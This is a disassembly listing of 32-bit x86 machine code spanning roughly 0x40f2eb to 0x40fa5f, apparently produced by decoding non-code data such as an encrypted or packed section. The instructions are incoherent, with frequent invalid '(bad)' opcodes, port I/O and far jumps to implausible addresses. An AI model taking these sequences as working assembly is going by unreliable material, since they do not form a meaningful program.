  40f2eb:	push   ds
  40f2ec:	retf   
  40f2ed:	jno    0x40f36b
  40f2ef:	sub    al,0xf2
  40f2f1:	lock cs or al,0xcb
  40f2f5:	jmp    0x974382ee
  40f2fa:	(bad)  
  40f2fc:	dec    edx
  40f2fd:	scas   eax,DWORD PTR es:[edi]
  40f2fe:	out    dx,eax
  40f2ff:	(bad)  
  40f300:	aas    
  40f301:	sbb    edi,DWORD PTR [ebx]
  40f303:	sub    BYTE PTR [eax],ch
  40f305:	daa    
  40f306:	mov    edx,0x1b3ba099
  40f30b:	jmp    0x40f30e
  40f30d:	or     cl,BYTE PTR [ebx-0x65]
  40f310:	xor    dh,0xcb
  40f313:	pop    esi
  40f314:	ja     0x40f358
  40f316:	add    eax,0xc073f706
  40f31b:	mov    edi,0xe0cff5c4
  40f320:	adc    al,BYTE PTR [esi]
  40f322:	or     esp,DWORD PTR [ebx+0xf]
  40f325:	jbe    0x40f32c
  40f327:	js     0x40f2cc
  40f329:	sub    bh,BYTE PTR [edx-0x68c52669]
  40f32f:	(bad)  
  40f330:	cwde   
  40f331:	lea    edx,[edi-0x4d]
  40f334:	pop    ecx
  40f335:	in     al,0x34
  40f337:	rcr    DWORD PTR [ebx+0x1b],cl
  40f33a:	(bad)  
  40f33b:	mov    ebp,0x81492d8e
  40f340:	loop   0x40f337
  40f342:	jne    0x40f2f5
  40f344:	loopne 0x40f39c
  40f346:	retf   0xde82
  40f349:	mov    bh,ah
  40f34b:	pop    esp
  40f34c:	bound  edi,QWORD PTR [ebp-0x2b]
  40f34f:	aam    0x2c
  40f351:	sbb    al,BYTE PTR ds:0x5f074bb9
  40f357:	cli    
  40f358:	jp     0x40f345
  40f35a:	pop    ebp
  40f35b:	mov    ebx,0x83ee48ea
  40f360:	sub    ebx,ebp
  40f362:	push   edx
  40f363:	aam    0x78
  40f365:	or     eax,DWORD PTR [ecx-0x78]
  40f368:	sub    al,0x5c
  40f36a:	popf   
  40f36b:	fmul   QWORD PTR [edi-0x71]
  40f36e:	sbb    BYTE PTR [esi],dl
  40f370:	fcom   DWORD PTR [eax]
  40f372:	jb     0x40f335
  40f374:	sub    ch,BYTE PTR [esi]
  40f376:	es cld 
  40f378:	outs   dx,BYTE PTR ds:[esi]
  40f379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f37a:	das    
  40f37b:	jb     0x40f313
  40f37d:	lahf   
  40f37e:	arpl   WORD PTR [eax+0x36d70532],bp
  40f384:	xor    eax,0x48af5e56
  40f389:	pusha  
  40f38a:	add    edx,DWORD PTR [ecx+0x42]
  40f38d:	mov    bh,0xc4
  40f38f:	push   es
  40f390:	add    eax,0xd3524952
  40f395:	or     ch,BYTE PTR [edx+0x19d5b7b6]
  40f39b:	jne    0x40f39e
  40f39d:	in     al,dx
  40f39e:	add    DWORD PTR [edx+edx*8+0x59],ecx
  40f3a2:	ins    BYTE PTR es:[edi],dx
  40f3a3:	test   BYTE PTR [edx+0x9],bh
  40f3a6:	cs mov esp,0x456791c2
  40f3ac:	ja     0x40f344
  40f3ae:	rol    DWORD PTR [edx],cl
  40f3b0:	test   BYTE PTR [eax],al
  40f3b2:	xor    cl,BYTE PTR [ebp+0x2]
  40f3b5:	xchg   edi,eax
  40f3b6:	xchg   BYTE PTR [edx-0x4e],dh
  40f3b9:	sbb    DWORD PTR [edx+0x35],esi
  40f3bc:	and    eax,0xd369219
  40f3c1:	imul   ebx,DWORD PTR [esi-0x2f24bc49],0xeb50ea1a
  40f3cb:	pop    ebp
  40f3cc:	xor    ebx,edi
  40f3ce:	or     dl,BYTE PTR [edx]
  40f3d0:	jmp    0xaa9:0x332deb46
  40f3d7:	push   0xffffffeb
  40f3d9:	xor    al,0x6d
  40f3db:	pop    esp
  40f3dc:	sub    al,0x22
  40f3de:	imul   edi,DWORD PTR [edi-0x409fce6e],0xfffffff4
  40f3e5:	test   eax,0x4d5b1f02
  40f3ea:	popa   
  40f3eb:	mov    ds:0x1edf9daf,al
  40f3f0:	jb     0x40f44f
  40f3f2:	out    0x15,eax
  40f3f4:	inc    eax
  40f3f5:	out    0xe3,eax
  40f3f7:	push   ebp
  40f3f8:	or     bh,BYTE PTR [eax]
  40f3fa:	imul   edi,DWORD PTR [ebx+0x41],0xa
  40f3fe:	(bad)  
  40f3ff:	sub    ah,cl
  40f401:	lds    edx,FWORD PTR [ecx]
  40f403:	cld    
  40f404:	aas    
  40f405:	xchg   esi,eax
  40f406:	shl    DWORD PTR [esi-0x25],cl
  40f409:	test   eax,0x2f6b1967
  40f40e:	xchg   ebx,eax
  40f40f:	(bad)  
  40f410:	call   0x9bf62bd6
  40f415:	inc    edi
  40f416:	inc    edi
  40f417:	mov    edx,0x312bf24a
  40f41c:	sbb    al,ch
  40f41e:	(bad)  
  40f41f:	mov    ebx,0xe4db4d5f
  40f424:	das    
  40f425:	sbb    ah,dl
  40f427:	jbe    0x40f434
  40f429:	mov    ebx,ecx
  40f42b:	jno    0x40f406
  40f42d:	adc    DWORD PTR [esi-0x12],eax
  40f430:	ss je  0x40f3d8
  40f433:	mov    cl,0x9b
  40f435:	sti    
  40f436:	inc    esp
  40f437:	out    dx,al
  40f438:	dec    edx
  40f439:	pop    edx
  40f43a:	test   eax,0x55c496e0
  40f43f:	mov    edi,0xaf5938a9
  40f444:	xchg   ah,dh
  40f446:	mov    BYTE PTR [ebx],ah
  40f448:	xor    eax,edx
  40f44a:	enter  0xb9c0,0xa0
  40f44e:	dec    esi
  40f44f:	mov    bh,al
  40f451:	in     eax,dx
  40f452:	jae    0x40f3e5
  40f454:	pop    esi
  40f455:	les    edi,FWORD PTR [edi-0x76]
  40f458:	lock imul eax,DWORD PTR [eax],0x943c1167
  40f45f:	call   0x709be966
  40f464:	imul   edx,DWORD PTR [edx+0x55f2cd6],0xd1e0daa8
  40f46e:	inc    ecx
  40f46f:	shl    DWORD PTR [ebx-0x5e7f736a],1
  40f475:	aas    
  40f476:	sub    al,0xee
  40f478:	mov    ?,WORD PTR [ebp+0x4b857c0b]
  40f47e:	xchg   ecx,eax
  40f47f:	cmp    DWORD PTR [ebx-0x10e061b0],ebp
  40f485:	test   ah,0x62
  40f488:	sbb    al,0x55
  40f48a:	ds push ebp
  40f48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f48d:	and    DWORD PTR [edi-0x7582e553],esi
  40f493:	xchg   BYTE PTR ss:[ebx+0x3d],bl
  40f497:	adc    al,0xf8
  40f499:	sbb    DWORD PTR [esi-0x1f],0x8110ed45
  40f4a0:	sbb    ebx,DWORD PTR [esp+edx*8]
  40f4a3:	dec    esp
  40f4a4:	stc    
  40f4a5:	pushf  
  40f4a6:	sub    DWORD PTR [ebp+0x19f0dc90],edi
  40f4ac:	stc    
  40f4ad:	ficomp DWORD PTR [eax+0x367b4c42]
  40f4b3:	push   edi
  40f4b4:	dec    ebp
  40f4b5:	add    edx,esp
  40f4b7:	ret    
  40f4b8:	lods   al,BYTE PTR ds:[esi]
  40f4b9:	call   0x2e66:0x60fbebb3
  40f4c0:	fidivr DWORD PTR [esi+0x22]
  40f4c3:	arpl   WORD PTR [edx+0x368a2277],ax
  40f4c9:	lea    esi,[edi-0x21bf3f4b]
  40f4cf:	cmp    BYTE PTR [esi+0x4c],ch
  40f4d2:	push   0x189806eb
  40f4d7:	iret   
  40f4d8:	js     0x40f52b
  40f4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4db:	push   ebx
  40f4dc:	hlt    
  40f4dd:	ret    0x528
  40f4e0:	cmp    edi,esp
  40f4e2:	imul   esi,DWORD PTR [edx],0xfffffff6
  40f4e5:	(bad)  [esi-0x5c]
  40f4e8:	xor    DWORD PTR [ecx+ecx*1-0x411f0178],ebp
  40f4ef:	(bad)  
  40f4f0:	into   
  40f4f1:	lea    ebx,[ecx]
  40f4f3:	ins    DWORD PTR es:[edi],dx
  40f4f4:	dec    ebx
  40f4f5:	xor    ecx,eax
  40f4f7:	bound  edi,QWORD PTR [edx-0xc56fcda]
  40f4fd:	lods   al,BYTE PTR ds:[esi]
  40f4fe:	or     ebp,edx
  40f500:	mov    ch,0x3d
  40f502:	call   0x9cb6:0xc39d2a45
  40f509:	icebp  
  40f50a:	add    eax,0xe9c3a934
  40f50f:	push   0x48
  40f511:	dec    ebp
  40f512:	inc    ebp
  40f513:	mov    ah,0x63
  40f515:	(bad)  
  40f516:	cmp    dh,BYTE PTR [ecx+0x71]
  40f519:	pusha  
  40f51a:	jbe    0x40f578
  40f51c:	jg     0x40f4d2
  40f51e:	mov    ds:0x36b5fb21,eax
  40f523:	ins    DWORD PTR es:[edi],dx
  40f524:	retw   0x894f
  40f528:	push   edi
  40f529:	clc    
  40f52a:	icebp  
  40f52b:	sub    bl,ch
  40f52d:	xchg   ecx,eax
  40f52e:	outs   dx,BYTE PTR ds:[esi]
  40f52f:	pop    ss
  40f530:	pop    ecx
  40f531:	enter  0x6511,0x67
  40f535:	cmp    BYTE PTR [esi+0x338d49c0],bl
  40f53b:	push   edi
  40f53c:	sbb    eax,0x1ea87ffa
  40f541:	sar    edi,0xd3
  40f544:	push   es
  40f545:	ds push 0x393f6b54
  40f54b:	mov    ds:0xe9e030e,eax
  40f550:	fwait
  40f551:	ins    DWORD PTR es:[edi],dx
  40f552:	out    dx,eax
  40f553:	pushf  
  40f554:	or     al,0x21
  40f556:	push   DWORD PTR [edx-0x42]
  40f559:	push   0xffffff94
  40f55b:	sbb    cl,ah
  40f55d:	inc    esp
  40f55e:	in     eax,dx
  40f55f:	cs xchg bp,ax
  40f562:	jmp    0x40f4e5
  40f564:	out    0x2e,eax
  40f566:	in     al,dx
  40f567:	xchg   edx,eax
  40f568:	cli    
  40f569:	mov    ah,0x74
  40f56b:	xchg   DWORD PTR [esi],edx
  40f56d:	imul   esi,DWORD PTR [ebx+0x70],0x47c42d0
  40f574:	sub    edi,ecx
  40f576:	dec    eax
  40f577:	xchg   esi,eax
  40f578:	loop   0x40f508
  40f57a:	xlat   BYTE PTR gs:[ebx]
  40f57c:	outs   dx,DWORD PTR ds:[esi]
  40f57d:	sub    BYTE PTR [ecx],cl
  40f57f:	loopne 0x40f509
  40f581:	add    al,0x5c
  40f583:	jmp    0xad6cdad0
  40f588:	adc    bl,BYTE PTR [ecx+0x49]
  40f58b:	push   ebx
  40f58c:	test   ebp,0x61126dee
  40f592:	dec    edi
  40f593:	pop    eax
  40f594:	fidiv  WORD PTR [ebx+0x1e]
  40f597:	pop    eax
  40f598:	addr16 push esp
  40f59a:	xor    eax,0x66963f9c
  40f59f:	mov    DWORD PTR [ebx],eax
  40f5a1:	rcl    DWORD PTR [ecx+0x3e9f6553],1
  40f5a7:	adc    al,0x76
  40f5a9:	and    DWORD PTR [esi-0x7c54c63],esi
  40f5af:	dec    edx
  40f5b0:	inc    edi
  40f5b1:	jecxz  0x40f5b9
  40f5b3:	jmp    0x9bf6:0xd5ae8eaa
  40f5ba:	das    
  40f5bb:	xchg   DWORD PTR [ebp+eax*4-0x56],esp
  40f5bf:	mov    ecx,0xd9630706
  40f5c4:	or     edi,ebx
  40f5c6:	nop
  40f5c7:	cmp    ebx,DWORD PTR [ecx-0x7]
  40f5ca:	sub    edi,0x48
  40f5cd:	rcr    DWORD PTR [edi+0x2c],cl
  40f5d0:	test   BYTE PTR [eax-0x69387659],0xd3
  40f5d7:	lods   al,BYTE PTR ds:[esi]
  40f5d8:	jae    0x40f5cb
  40f5da:	es jno 0x40f578
  40f5dd:	push   ds
  40f5de:	dec    edi
  40f5df:	jecxz  0x40f5de
  40f5e1:	mov    DWORD PTR [edx+0x189b26bd],ebp
  40f5e7:	mov    esi,0xa1255144
  40f5ec:	lea    eax,[ebp+0x2cdc6a5f]
  40f5f2:	adc    ch,BYTE PTR [ecx+0x26]
  40f5f5:	or     eax,0x1c1f40cb
  40f5fa:	sub    edx,edi
  40f5fc:	jb     0x40f5bf
  40f5fe:	sub    al,BYTE PTR [edx-0x1e2a76ef]
  40f604:	mov    bl,0x9d
  40f606:	popa   
  40f607:	fs adc eax,0x77a301d9
  40f60d:	pop    es
  40f60e:	out    0x12,al
  40f610:	xor    ecx,DWORD PTR [ecx-0x40323c49]
  40f616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f617:	mov    ds:0x312f2c4a,al
  40f61c:	fdivr  st(1),st
  40f61e:	cs or  bh,ah
  40f621:	adc    eax,0x5aa14528
  40f626:	sub    bh,BYTE PTR [edi-0x53f9d40e]
  40f62c:	nop
  40f62d:	sbb    ebx,esp
  40f62f:	mov    edx,0xd0e1bf32
  40f634:	xlat   BYTE PTR ds:[ebx]
  40f635:	sub    DWORD PTR [ebx],eax
  40f637:	add    esi,DWORD PTR ds:0x7315cf19
  40f63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f63e:	imul   eax,DWORD PTR [ebx-0x3c5568fa],0x9370fbf8
  40f648:	add    DWORD PTR [ecx],edx
  40f64a:	outs   dx,BYTE PTR ds:[esi]
  40f64b:	xchg   edx,eax
  40f64c:	push   edi
  40f64d:	jno    0x40f6bf
  40f64f:	test   eax,0x45b6cd25
  40f654:	jb     0x40f69e
  40f656:	xchg   ebp,eax
  40f657:	inc    esi
  40f658:	imul   eax,DWORD PTR [esi+0x6b],0xc82166c8
  40f65f:	in     eax,dx
  40f660:	cmp    BYTE PTR [ecx],0x76
  40f663:	xor    DWORD PTR ds:0x96f5effb,esi
  40f669:	jae    0x40f690
  40f66b:	(bad)  
  40f66c:	adc    DWORD PTR [edi-0x76],ebx
  40f66f:	jecxz  0x40f6b7
  40f671:	adc    BYTE PTR [edi+0x1f],0x6d
  40f675:	inc    ebx
  40f676:	mov    BYTE PTR [ebp+0x7b340cf6],0x6e
  40f67d:	call   0xd098:0xd5bf85c4
  40f684:	aaa    
  40f685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f686:	ins    DWORD PTR es:[edi],dx
  40f687:	xchg   edi,ecx
  40f689:	(bad)  
  40f68b:	icebp  
  40f68c:	das    
  40f68d:	sub    eax,ebp
  40f68f:	loope  0x40f683
  40f691:	mov    WORD PTR [edi+0x3c01562a],fs
  40f697:	clc    
  40f698:	jae    0x40f689
  40f69a:	daa    
  40f69b:	arpl   WORD PTR [esi],si
  40f69d:	pop    ss
  40f69e:	out    0x3e,al
  40f6a0:	lods   eax,DWORD PTR ds:[esi]
  40f6a1:	cmp    dh,BYTE PTR [ebx+0x49]
  40f6a4:	mov    eax,0x523c43b0
  40f6a9:	pop    edx
  40f6aa:	inc    ebp
  40f6ab:	push   ds
  40f6ac:	mov    edi,0xff33d3ab
  40f6b1:	jae    0x40f719
  40f6b3:	in     eax,0x21
  40f6b5:	std    
  40f6b6:	push   cs
  40f6b7:	dec    ebx
  40f6b8:	mov    ds:0x2ffd1a16,al
  40f6bd:	aam    0xde
  40f6bf:	cs sub eax,0x36ec83b6
  40f6c5:	popa   
  40f6c6:	add    dh,BYTE PTR [edi]
  40f6c8:	cli    
  40f6c9:	adc    esi,DWORD PTR [ebx]
  40f6cb:	pop    edi
  40f6cc:	push   0x5c
  40f6ce:	push   ss
  40f6cf:	lock push cs
  40f6d1:	aad    0xc8
  40f6d3:	sbb    eax,0xaf2b71be
  40f6d8:	aam    0x87
  40f6da:	push   esi
  40f6db:	fld    TBYTE PTR [edx-0x1f0db840]
  40f6e1:	cld    
  40f6e2:	inc    ecx
  40f6e3:	dec    ebp
  40f6e4:	aad    0x19
  40f6e6:	shl    BYTE PTR [ecx+0x484851ec],cl
  40f6ec:	mov    DWORD PTR [edi-0x12],esi
  40f6ef:	hlt    
  40f6f0:	sahf   
  40f6f1:	outs   dx,BYTE PTR ds:[esi]
  40f6f2:	jnp    0x40f6b0
  40f6f4:	push   es
  40f6f5:	clc    
  40f6f6:	call   0x9184:0x3492ce08
  40f6fd:	bnd jne 0x40f68f
  40f700:	adc    ecx,DWORD PTR [esi-0x4c254ee9]
  40f706:	outs   dx,DWORD PTR ds:[esi]
  40f707:	call   0x424:0x7f0275ea
  40f70e:	test   al,0xb2
  40f710:	aam    0x91
  40f712:	push   es
  40f713:	mov    cs,WORD PTR [ebx-0x1b]
  40f716:	fld    QWORD PTR [eax+eax*2]
  40f719:	adc    DWORD PTR [edi-0x4],edx
  40f71c:	adc    edx,DWORD PTR [edi+0x60]
  40f71f:	mov    esp,0x52286e72
  40f724:	push   edx
  40f725:	xor    ecx,ebx
  40f727:	test   al,0xaa
  40f729:	psrlq  mm7,QWORD PTR [ecx-0x21]
  40f72d:	push   ds
  40f72e:	push   edi
  40f72f:	jg     0x40f6de
  40f731:	sub    ch,al
  40f733:	jecxz  0x40f790
  40f735:	and    eax,0x8bf2aba6
  40f73a:	loop   0x40f741
  40f73c:	addr16 js 0x40f713
  40f73f:	out    0x50,al
  40f741:	mov    al,0xa
  40f743:	jmp    0xc78c45
  40f748:	call   0x649b17df
  40f74d:	push   ebp
  40f74e:	add    esp,DWORD PTR ds:0x3b3659d1
  40f754:	cmp    ebx,DWORD PTR [edx]
  40f756:	xor    ch,BYTE PTR [edx+0x19ec69ad]
  40f75c:	retf   
  40f75d:	cmp    edx,DWORD PTR [ebx+0x1b]
  40f760:	fadd   DWORD PTR ds:0xac340990
  40f766:	mov    al,ds:0xa4a72dd8
  40f76b:	mov    ah,0xd8
  40f76d:	in     al,dx
  40f76e:	imul   ebp,DWORD PTR [ebp+0x2e0b2e8d],0x27
  40f775:	jl     0x40f7e6
  40f777:	inc    edx
  40f778:	pop    DWORD PTR [ecx+0xd]
  40f77b:	repz sub ebx,DWORD PTR es:[edi+0x68a0b03d]
  40f783:	loop   0x40f769
  40f785:	fisubr DWORD PTR [edi-0x20]
  40f788:	cmp    al,0x57
  40f78a:	sub    edx,DWORD PTR [ebp-0x239fa58e]
  40f790:	lock sbb al,0x38
  40f793:	sbb    al,bh
  40f795:	pop    ebx
  40f796:	cli    
  40f797:	xchg   BYTE PTR [esi-0x80],ah
  40f79a:	cmp    eax,0x3a2e57d4
  40f79f:	inc    edx
  40f7a0:	xchg   ecx,eax
  40f7a1:	ja     0x40f75c
  40f7a3:	mov    es,WORD PTR [esp+ebx*2-0x58045719]
  40f7aa:	cmovg  esp,DWORD PTR [esi]
  40f7ad:	cdq    
  40f7ae:	dec    ebx
  40f7af:	lods   eax,DWORD PTR ds:[esi]
  40f7b0:	cmp    al,0x74
  40f7b2:	(bad)  
  40f7b3:	xlat   BYTE PTR ds:[ebx]
  40f7b4:	jp     0x40f7bd
  40f7b6:	ror    BYTE PTR [ebx],0x6a
  40f7b9:	add    al,0xa
  40f7bb:	sub    BYTE PTR [ebx-0x72],ah
  40f7be:	or     BYTE PTR [esi-0x2a],cl
  40f7c1:	jecxz  0x40f7dd
  40f7c3:	lods   eax,DWORD PTR ds:[esi]
  40f7c4:	pop    es
  40f7c5:	pop    edx
  40f7c6:	fcomp  QWORD PTR [esi]
  40f7c8:	jbe    0x40f836
  40f7ca:	pushf  
  40f7cb:	jmp    0xd111:0xe84647ae
  40f7d2:	jecxz  0x40f839
  40f7d4:	out    dx,eax
  40f7d5:	mov    edx,ds
  40f7d7:	sub    dh,BYTE PTR [edx-0x28]
  40f7da:	aaa    
  40f7db:	push   es
  40f7dc:	retf   
  40f7dd:	and    edx,esi
  40f7df:	pushaw 
  40f7e1:	sub    dh,bl
  40f7e3:	sar    DWORD PTR [edx+0x16],0xb2
  40f7e7:	(bad)  
  40f7e8:	out    dx,eax
  40f7e9:	mov    dh,0x3e
  40f7eb:	sub    DWORD PTR [edi+0x45f0d579],esp
  40f7f1:	cmp    DWORD PTR [edx-0x7c],0x12ea929b
  40f7f8:	clc    
  40f7f9:	xchg   ecx,eax
  40f7fa:	cmp    BYTE PTR [eax+0x31],bh
  40f7fd:	mul    esp
  40f7ff:	mov    BYTE PTR [esi+0x5b3eba39],ch
  40f805:	pop    ebx
  40f806:	jae    0x40f842
  40f808:	loope  0x40f798
  40f80a:	js     0x40f832
  40f80c:	nop
  40f80d:	test   DWORD PTR [bx+si-0x76],ebx
  40f811:	sar    BYTE PTR [ebx+0x4a],0x9b
  40f815:	mov    ah,0xde
  40f817:	mov    edi,0x4ea6954c
  40f81c:	retf   
  40f81d:	lds    ebp,FWORD PTR [esi-0x74]
  40f820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f821:	mov    ebx,0x4b216309
  40f826:	sub    ch,BYTE PTR [eax]
  40f828:	xchg   ebx,eax
  40f829:	(bad)  [ebp+0x66]
  40f82c:	(bad)  
  40f82d:	xor    BYTE PTR [ebp+0x4516c45b],bl
  40f833:	scas   al,BYTE PTR es:[edi]
  40f834:	fimul  WORD PTR [ebp-0x4d]
  40f837:	or     al,0xcb
  40f839:	add    al,0x46
  40f83b:	stc    
  40f83c:	retf   0xede5
  40f83f:	and    esp,DWORD PTR [esi]
  40f841:	pop    ebx
  40f842:	addr16 shr ebx,0x68
  40f846:	pop    ebx
  40f847:	inc    eax
  40f848:	sub    edx,ebp
  40f84a:	push   cs
  40f84b:	pop    es
  40f84c:	mov    ds:0x2eb500eb,al
  40f851:	shl    DWORD PTR [edi],0xa
  40f854:	inc    ecx
  40f855:	pop    bx
  40f857:	mov    ah,BYTE PTR [edi]
  40f859:	leave  
  40f85a:	cmp    BYTE PTR [ecx-0x4d],bh
  40f85d:	cmp    DWORD PTR [ecx-0x4b],eax
  40f860:	(bad)  
  40f861:	por    mm6,QWORD PTR [esi+0x5c3b9801]
  40f868:	shl    edi,cl
  40f86a:	mov    BYTE PTR [edi+0x6a523702],0xf3
  40f871:	add    eax,0xfa2706fa
  40f876:	mov    ds:0xf1b7a73a,eax
  40f87b:	jp     0x40f803
  40f87d:	pop    ecx
  40f87e:	les    edi,FWORD PTR [edx+0x3b59ebe9]
  40f884:	and    BYTE PTR [edi+0x4f],bl
  40f887:	push   ss
  40f888:	ret    
  40f889:	int    0x27
  40f88b:	adc    bh,BYTE PTR [esi]
  40f88d:	fiadd  DWORD PTR [edx-0x2819214e]
  40f893:	lock fst st(1)
  40f896:	inc    edx
  40f897:	push   esp
  40f898:	clc    
  40f899:	idiv   esp
  40f89b:	mov    ch,0xf
  40f89d:	fld    TBYTE PTR [esi-0x45]
  40f8a0:	cdq    
  40f8a1:	sub    eax,0xca411a58
  40f8a6:	mov    dl,0xbe
  40f8a8:	jg     0x40f82d
  40f8aa:	cmp    ebx,DWORD PTR [ecx]
  40f8ac:	cmp    ax,WORD PTR [esi]
  40f8af:	fist   DWORD PTR [ebp-0x378a9f7d]
  40f8b5:	into   
  40f8b6:	inc    eax
  40f8b7:	retf   
  40f8b8:	retf   0x46d5
  40f8bb:	ret    0xb7b
  40f8be:	les    ebp,FWORD PTR [edx+0x31875510]
  40f8c4:	xchg   ebx,eax
  40f8c5:	out    dx,al
  40f8c6:	and    ch,BYTE PTR [edx]
  40f8c8:	and    ebp,DWORD PTR [esi]
  40f8ca:	add    al,BYTE PTR [ebp-0x6178d79a]
  40f8d0:	ja     0x40f8bf
  40f8d2:	dec    ebx
  40f8d3:	les    esi,FWORD PTR [esi]
  40f8d5:	sub    DWORD PTR [ecx+esi*1-0x60],0xb
  40f8da:	mov    cl,0x84
  40f8dc:	add    eax,0x57ce725e
  40f8e1:	jne    0x40f891
  40f8e3:	pushf  
  40f8e4:	hlt    
  40f8e5:	push   esi
  40f8e6:	mov    ecx,0x215438d1
  40f8eb:	jne    0x40f90b
  40f8ed:	(bad)  
  40f8ee:	not    DWORD PTR [ecx]
  40f8f0:	sub    esp,ecx
  40f8f2:	(bad)  
  40f8f3:	adc    BYTE PTR [ebx-0x439b5685],ah
  40f8f9:	stos   BYTE PTR es:[edi],al
  40f8fa:	daa    
  40f8fb:	add    eax,0xbccc5936
  40f900:	or     eax,0x25ed4d80
  40f905:	mov    ebx,0x360639c2
  40f90a:	adc    dl,BYTE PTR ds:0xfcc052b7
  40f910:	add    al,0x48
  40f912:	arpl   WORD PTR [ebp-0x59],si
  40f915:	test   al,0x83
  40f917:	stos   DWORD PTR es:[edi],eax
  40f918:	push   0xffffff8a
  40f91a:	daa    
  40f91b:	popa   
  40f91c:	int    0xd0
  40f91e:	lds    eax,FWORD PTR [edi+0x9]
  40f921:	cdq    
  40f922:	cmp    cl,BYTE PTR [ecx-0x5d]
  40f925:	ss mov ch,0x37
  40f928:	add    eax,0x9395d29
  40f92d:	xchg   esi,eax
  40f92e:	fwait
  40f92f:	or     BYTE PTR [ecx+0xc],0x2b
  40f933:	(bad)  
  40f934:	scas   eax,DWORD PTR es:[edi]
  40f935:	jmp    DWORD PTR [edx+0x66]
  40f938:	mov    al,0x81
  40f93a:	outs   dx,DWORD PTR ds:[esi]
  40f93b:	mov    ecx,DWORD PTR [edi+0x6ecd62a]
  40f941:	or     eax,0x408f15e3
  40f946:	mov    ch,BYTE PTR [eax]
  40f948:	(bad)  
  40f949:	enter  0xcf9,0xd
  40f94d:	mov    ch,0xd3
  40f94f:	inc    eax
  40f950:	(bad)  
  40f951:	sahf   
  40f952:	mov    esi,0xce3132b5
  40f957:	sahf   
  40f958:	ror    BYTE PTR [eax],cl
  40f95a:	xchg   esi,eax
  40f95b:	in     eax,dx
  40f95c:	aaa    
  40f95d:	sti    
  40f95e:	ds push ds
  40f960:	sbb    eax,0xa05c30c
  40f965:	push   ecx
  40f966:	mov    edx,0x269afaa
  40f96b:	inc    ecx
  40f96c:	push   0x58
  40f96e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f96f:	pop    ebp
  40f970:	in     al,0xac
  40f972:	push   esi
  40f973:	popa   
  40f974:	pop    es
  40f975:	lahf   
  40f976:	leave  
  40f977:	stc    
  40f978:	(bad)  
  40f979:	fisubr WORD PTR [edx-0x1d]
  40f97c:	sub    eax,esi
  40f97e:	push   ds
  40f97f:	sub    al,0x7e
  40f981:	and    al,0x68
  40f983:	push   esp
  40f984:	adc    DWORD PTR [edi-0x3d],esi
  40f987:	(bad)  
  40f988:	shl    BYTE PTR [ebx+0x5e138ca8],1
  40f98e:	sub    cl,BYTE PTR [esi+0x51dda577]
  40f994:	jle    0x40f9e4
  40f996:	push   ss
  40f997:	cmp    ebx,DWORD PTR [esi]
  40f999:	dec    BYTE PTR [ebx]
  40f99b:	sub    eax,0x8f1086e4
  40f9a0:	retf   
  40f9a1:	clc    
  40f9a2:	xchg   esi,eax
  40f9a3:	jmp    0xcb87002b
  40f9a8:	out    0x88,al
  40f9aa:	retf   0x1b54
  40f9ad:	cmp    BYTE PTR [ebx],ch
  40f9af:	mov    ebx,0xd5cb9bba
  40f9b4:	icebp  
  40f9b5:	mov    edx,0xd6e2cfb3
  40f9ba:	dec    ebx
  40f9bb:	mov    bl,0x54
  40f9bd:	inc    esp
  40f9be:	pop    ebx
  40f9bf:	ins    BYTE PTR es:[edi],dx
  40f9c0:	push   esi
  40f9c1:	popf   
  40f9c2:	lods   eax,DWORD PTR ds:[esi]
  40f9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c4:	out    0x39,eax
  40f9c6:	and    ah,BYTE PTR [edx]
  40f9c8:	push   0x4d
  40f9ca:	add    DWORD PTR ds:0x736daa3,ebx
  40f9d0:	dec    ebx
  40f9d1:	mov    ebx,0x4bba8abb
  40f9d6:	lahf   
  40f9d7:	mov    ecx,0x70c3c5e6
  40f9dc:	lahf   
  40f9dd:	pop    es
  40f9de:	sar    BYTE PTR es:[edx],0xd
  40f9e2:	lods   eax,DWORD PTR ds:[esi]
  40f9e3:	mov    fs,eax
  40f9e5:	cwde   
  40f9e6:	inc    ecx
  40f9e7:	push   eax
  40f9e8:	cld    
  40f9e9:	dec    esp
  40f9ea:	mov    eax,ds:0xbe708b96
  40f9ef:	and    al,0xd4
  40f9f1:	paddusw mm0,mm1
  40f9f4:	dec    ebx
  40f9f5:	lods   eax,DWORD PTR ds:[esi]
  40f9f6:	(bad)  
  40f9f7:	std    
  40f9f8:	out    dx,al
  40f9f9:	fistp  DWORD PTR [edx-0xfe2efce]
  40f9ff:	mov    dh,0xc1
  40fa01:	mov    al,ds:0x953ab918
  40fa06:	sub    DWORD PTR [ebp+0x1c9935d3],esi
  40fa0c:	sub    esp,DWORD PTR [edi]
  40fa0e:	dec    eax
  40fa0f:	in     eax,0x14
  40fa11:	mov    ds,WORD PTR [edx]
  40fa13:	sbb    DWORD PTR ds:0x95591e74,edi
  40fa19:	xchg   esp,eax
  40fa1a:	cmp    BYTE PTR [ecx+0x5c],dh
  40fa1d:	sbb    eax,esp
  40fa1f:	mov    edx,0x11bb56ee
  40fa24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa25:	sbb    BYTE PTR [esi-0x4f],dh
  40fa28:	mov    bl,0x1
  40fa2a:	xchg   esp,eax
  40fa2b:	ret    
  40fa2c:	xchg   edx,eax
  40fa2d:	pop    ebx
  40fa2e:	fistp  QWORD PTR [edi]
  40fa30:	jb     0x40f9bd
  40fa32:	mov    bh,0xc
  40fa34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa35:	sti    
  40fa36:	jno    0x40fa00
  40fa38:	push   edi
  40fa39:	or     ecx,DWORD PTR fs:[esi+ebp*1+0x5b]
  40fa3e:	aad    0x2e
  40fa40:	jne    0x40fa6b
  40fa42:	adc    edi,DWORD PTR [ebx+edi*4+0x1e]
  40fa46:	jmp    0xffe32892
  40fa4b:	cmp    BYTE PTR ds:0x7786f732,0x57
  40fa52:	jle    0x40fa49
  40fa54:	xor    eax,0xee0c154
  40fa59:	xchg   ebx,eax
  40fa5a:	adc    DWORD PTR [ecx+ebx*1+0x37],edx
  40fa5e:	outs   dx,BYTE PTR ds:[esi]
  40fa5f:	(bad)  
